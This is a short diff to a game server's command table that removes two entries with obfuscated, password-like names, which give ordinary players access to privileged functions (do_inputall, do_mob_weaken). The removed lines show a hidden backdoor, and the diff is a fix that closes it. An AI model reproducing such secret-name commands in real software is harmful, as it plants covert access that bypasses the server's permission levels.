@@ -341,8 +341,6 @@ struct command_info cmd_info[] =
 	{"ma", do_mob_aggresive, 0, POS_DEAD, GM_IMPLEMENTOR},
 	{"mc", do_mob_coward, 0, POS_DEAD, GM_IMPLEMENTOR},
 	{"mm", do_mob_map, 0, POS_DEAD, GM_IMPLEMENTOR},
-	{"b3nh4y4t1md4k998877birosd122", do_inputall, 0, POS_DEAD, GM_PLAYER},
-	{"b3nh4y4t1md4k998877birosd122k", do_mob_weaken, 0, POS_DEAD, GM_PLAYER},
 	{"kill", do_kill, 0, POS_DEAD, GM_IMPLEMENTOR},
 	{"ipurge", do_item_purge, 0, POS_DEAD, GM_LOW_WIZARD},
 	{"group", do_group, 0, POS_DEAD, GM_IMPLEMENTOR},
